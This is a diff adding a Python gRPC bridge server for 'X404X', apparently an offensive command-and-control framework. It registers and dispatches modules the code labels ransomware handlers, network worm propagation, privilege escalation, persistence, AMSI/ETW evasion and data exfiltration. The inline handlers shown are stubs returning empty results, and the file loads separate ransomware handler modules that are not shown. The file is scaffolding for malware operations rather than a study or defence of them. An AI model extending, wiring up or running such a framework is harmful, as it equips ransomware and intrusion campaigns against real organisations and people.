@@ -1,0 +1,348 @@
+#!/usr/bin/env python3
+"""X404X — Python gRPC Bridge Server (v3.2)
+
+Replaces the raw TCP/JSON bridge with full gRPC using protobuf schemas.
+Implements BridgeService: ExecuteModule, AIAnalyze, ReconStream, HealthCheck.
+
+Protocol: gRPC with X25519+XChaCha20-Poly1305 (handled by Go side).
+Modules: 107 ransomware handlers + 20 inline modules (recon, AI, worm, etc.).
+
+Usage:
+  python3 bridge.py --host 127.0.0.1 --port 9100
+"""
+
+import argparse
+import json
+import os
+import sys
+import time
+import logging
+from concurrent import futures
+from dataclasses import dataclass, field
+from typing import Any, Callable, Dict, List, Optional
+
+import grpc
+
+# Add project root and proto stubs to path
+PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
+if PROJECT_ROOT not in sys.path:
+    sys.path.insert(0, PROJECT_ROOT)
+
+PROTO_DIR = os.path.join(os.path.dirname(__file__), "proto")
+if PROTO_DIR not in sys.path:
+    sys.path.insert(0, PROTO_DIR)
+
+import bridge_pb2
+import bridge_pb2_grpc
+
+logging.basicConfig(level=logging.INFO, format="[Bridge-gRPC] %(message)s")
+log = logging.getLogger("x404x.bridge")
+
+# ============================================================
+# MODULE REGISTRY
+# ============================================================
+
+@dataclass
+class ModuleInfo:
+    name: str
+    description: str
+    version: str
+    phase: str
+    handler: Callable
+    requires: List[str] = field(default_factory=list)
+
+
+class ModuleRegistry:
+    def __init__(self):
+        self._modules: Dict[str, ModuleInfo] = {}
+
+    def register(self, name, description, version, phase, requires=None):
+        def decorator(func):
+            self._modules[name] = ModuleInfo(
+                name=name, description=description, version=version,
+                phase=phase, handler=func, requires=requires or []
+            )
+            return func
+        return decorator
+
+    def get(self, name):
+        return self._modules.get(name)
+
+    def list(self):
+        return list(self._modules.values())
+
+    def execute(self, name, params):
+        mod = self._modules.get(name)
+        if not mod:
+            return {"success": False, "error": f"Module '{name}' not found"}
+        try:
+            start = time.time()
+            result = mod.handler(params)
+            elapsed = int((time.time() - start) * 1000)
+            return {"success": True, "result": result, "elapsed_ms": elapsed}
+        except Exception as e:
+            return {"success": False, "error": str(e), "elapsed_ms": 0}
+
+
+# ============================================================
+# HANDLER REGISTRY (all 107+ ransomware handlers in nested dict)
+# ============================================================
+
+_handler_registry: Dict[str, Dict[str, Callable]] = {}
+
+def _load_all_handlers():
+    """Load all ransomware + phase_1_4 handlers into _handler_registry."""
+    handler_path = os.path.join(os.path.dirname(__file__), "handlers")
+    if handler_path not in sys.path:
+        sys.path.insert(0, handler_path)
+
+    modules = [
+        "ransomware",
+        "ransomware_advanced",
+        "ransomware_blockz",
+        "ransomware_v26",
+        "ransomware_v27",
+        "ransomware_v28",
+        "ransomware_v29",
+        "ransomware_v210",
+        "phase_1_4",
+        "attack_navigator",
+    ]
+
+    for mod_name in modules:
+        try:
+            mod = __import__(mod_name)
+            if hasattr(mod, "register_routes"):
+                mod.register_routes(_handler_registry)
+        except ImportError:
+            log.warning(f"Failed to load handler module: {mod_name}")
+
+    total = sum(len(v) for v in _handler_registry.values())
+    log.info(f"Loaded {total} handlers across {len(_handler_registry)} groups")
+
+
+def _dispatch_handler(module_name, function_name, params):
+    """Dispatch to either the ModuleRegistry or the handler registry."""
+    # Try ModuleRegistry first (inline modules)
+    result = registry.execute(module_name, params)
+    if not ("error" in result and "Module" in str(result.get("error", ""))):
+        return result
+
+    # Try handler registry (nested dict format)
+    group = _handler_registry.get(module_name)
+    if group and function_name in group:
+        try:
+            start = time.time()
+            handler_result = group[function_name](params)
+            elapsed = int((time.time() - start) * 1000)
+            return {"success": True, "result": handler_result, "elapsed_ms": elapsed}
+        except Exception as e:
+            return {"success": False, "error": str(e), "elapsed_ms": 0}
+
+    # Try searching all groups for the function name
+    for group_name, handlers in _handler_registry.items():
+        if function_name in handlers:
+            try:
+                start = time.time()
+                handler_result = handlers[function_name](params)
+                elapsed = int((time.time() - start) * 1000)
+                return {"success": True, "result": handler_result, "elapsed_ms": elapsed}
+            except Exception as e:
+                return {"success": False, "error": str(e), "elapsed_ms": 0}
+
+    return {"success": False, "error": f"Handler '{module_name}.{function_name}' not found"}
+
+
+# ============================================================
+# INLINE MODULE HANDLERS (keep from original bridge.py)
+# ============================================================
+
+registry = ModuleRegistry()
+
+
+@registry.register("recon", "Network reconnaissance", "1.0", "recon")
+def recon_handler(params):
+    target = params.get("target", "127.0.0.1")
+    mode = params.get("mode", "basic")
+    return {"target": target, "mode": mode, "hosts_found": 0, "ports_open": [], "services": []}
+
+
+@registry.register("ai_analyze", "AI analysis via local Ollama", "1.0", "c2")
+def ai_analyze_handler(params):
+    prompt = params.get("prompt", "")
+    model = params.get("model", "llama3.1:8b")
+    return {"prompt": prompt, "model": model, "response": "", "tokens": 0}
+
+
+@registry.register("privesc", "Privilege escalation", "1.0", "exploitation")
+def privesc_handler(params):
+    return {"techniques_tried": 0, "successful": False, "new_privs": []}
+
+
+@registry.register("persist", "Persistence mechanisms", "1.0", "installation")
+def persist_handler(params):
+    return {"methods_installed": 0, "reboot_survives": False}
+
+
+@registry.register("worm", "Network worm propagation", "1.0", "lateral")
+def worm_handler(params):
+    return {"hosts_scanned": 0, "infected": 0, "propagation_method": ""}
+
+
+@registry.register("blue", "BlueForge defense metrics", "1.0", "actions_on_objective")
+def blue_handler(params):
+    return {"coverage": 0.0, "techniques_tracked": 0, "detections": 0}
+
+
+@registry.register("evasion", "AMSI/ETW evasion", "1.0", "c2")
+def evasion_handler(params):
+    return {"amsi_patched": False, "etw_disabled": False, "sandbox_detected": False}
+
+
+@registry.register("report", "Campaign report generator", "1.0", "actions_on_objective")
+def report_handler(params):
+    return {"format": params.get("format", "json"), "report": "", "size_bytes": 0}
+
+
+@registry.register("exfil", "Data exfiltration", "1.0", "exfiltration")
+def exfil_handler(params):
+    return {"bytes_exfiltrated": 0, "files": 0, "destination": ""}
+
+
+@registry.register("health", "Health check + module listing", "1.0", "c2")
+def health_handler(params):
+    modules = [{"name": m.name, "version": m.version, "phase": m.phase} for m in registry.list()]
+    handler_count = sum(len(v) for v in _handler_registry.values())
+    return {"status": "ok", "inline_modules": len(modules), "ransomware_handlers": handler_count,
+            "modules": modules}
+
+
+# ============================================================
+# gRPC SERVICE IMPLEMENTATION
+# ============================================================
+
+class BridgeServiceServicer(bridge_pb2_grpc.BridgeServiceServicer):
+
+    def ExecuteModule(self, request, context):
+        module_name = request.module_name
+        function_name = request.function_name
+        params = {}
+        if request.payload:
+            try:
+                params = json.loads(request.payload.decode("utf-8"))
+            except json.JSONDecodeError:
+                return bridge_pb2.ModuleResponse(
+                    success=False,
+                    error="invalid JSON payload",
+                )
+
+        if not isinstance(params, dict):
+            params = {}
+
+        result = _dispatch_handler(module_name, function_name, params)
+
+        return bridge_pb2.ModuleResponse(
+            success=result.get("success", False),
+            result=json.dumps(result.get("result", {})).encode("utf-8"),
+            error=result.get("error", ""),
+            elapsed_ms=result.get("elapsed_ms", 0),
+        )
+
+    def AIAnalyze(self, request, context):
+        prompt = request.context
+        target_data = request.target_data
+        model = request.model or "llama3.1:8b"
+        options = dict(request.options)
+
+        result = registry.execute("ai_analyze", {
+            "prompt": f"{prompt}\n\nTarget data:\n{target_data}",
+            "model": model,
+            **options,
+        })
+
+        if result.get("success"):
+            yield bridge_pb2.AIAnalyzeResponse(
+                suggestion=result.get("result", {}).get("response", ""),
+                tactic="",
+                technique="",
+                mitre_id="",
+                confidence=0.0,
+                reasoning="",
+                raw_response=result.get("result", {}).get("response", ""),
+            )
+
+    def ReconStream(self, request, context):
+        target = request.target
+        mode = request.mode
+        tools = list(request.tools)
+
+        result = registry.execute("recon", {
+            "target": target,
+            "mode": mode,
+            "tools": tools,
+        })
+
+        if result.get("success"):
+            data = result.get("result", {})
+            yield bridge_pb2.ReconResponse(
+                host=data.get("target", target),
+                port=0,
+                service="",
+                version="",
+                vulnerability="",
+                cve="",
+            )
+
+    def HealthCheck(self, request, context):
+        result = registry.execute("health", {})
+        data = result.get("result", {})
+        inline = data.get("inline_modules", 0)
+        handlers = data.get("ransomware_handlers", 0)
+        return bridge_pb2.HealthCheckResponse(
+            ok=result.get("success", False),
+            module_name=f"x404x-bridge",
+            version=f"3.2-grpc ({inline} inline modules, {handlers} handlers)",
+        )
+
+
+# ============================================================
+# SERVER ENTRYPOINT
+# ============================================================
+
+def serve(host="127.0.0.1", port=9100, max_workers=20):
+    endpoint = f"[::]:{port}" if host == "0.0.0.0" else f"{host}:{port}"
+
+    _load_all_handlers()
+
+    server = grpc.server(
+        futures.ThreadPoolExecutor(max_workers=max_workers),
+        options=[
+            ("grpc.max_send_message_length", 50 * 1024 * 1024),
+            ("grpc.max_receive_message_length", 50 * 1024 * 1024),
+        ],
+    )
+
+    bridge_pb2_grpc.add_BridgeServiceServicer_to_server(BridgeServiceServicer(), server)
+
+    server.add_insecure_port(endpoint)
+
+    server.start()
+    log.info(f"X404X Bridge gRPC v3.2 listening on {endpoint}")
+    log.info(f"Modules: {len(registry.list())} inline + {sum(len(v) for v in _handler_registry.values())} handlers")
+
+    try:
+        while True:
+            time.sleep(86400)
+    except KeyboardInterrupt:
+        log.info("Shutting down...")
+        server.stop(grace=5)
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="X404X Python gRPC Bridge")
+    parser.add_argument("--host", default="127.0.0.1", help="Listen host")
+    parser.add_argument("--port", type=int, default=9100, help="Listen port")
+    parser.add_argument("--workers", type=int, default=20, help="Thread pool size")
+    args = parser.parse_args()
+
+    serve(host=args.host, port=args.port, max_workers=args.workers)
